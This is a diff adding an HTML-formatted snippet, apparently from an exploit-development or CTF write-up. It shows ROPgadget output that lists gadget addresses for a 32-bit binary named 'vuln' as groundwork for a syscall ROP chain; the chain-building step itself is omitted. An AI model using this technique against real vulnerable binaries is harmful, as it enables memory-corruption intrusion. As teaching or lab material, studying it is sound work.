@@ -1,0 +1,29 @@
+<span style="color:#DC3958">$</span> ROPgadget --binary vuln --ropchain
+
+ROP chain generation
+===========================================================
+
+- Step 1 -- Write-what-where gadgets
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8059102 mov dword ptr [edx], eax ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80b074a pop eax ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret
+
+- Step 2 -- Init syscall number gadgets
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x808055e inc eax ; ret
+
+- Step 3 -- Init syscall arguments gadgets
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049022 pop ebx ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049e39 pop ecx ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret
+
+- Step 4 -- Syscall gadget
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804a3d2 int 0x80
+
+- Step 5 -- Build the ROP chain
+<div class="text-center text-[12px] py-1 mt-8 whitespace-pre rounded-sm bg-[#292929]">(omitted for brevity, will be in final script!)</div>
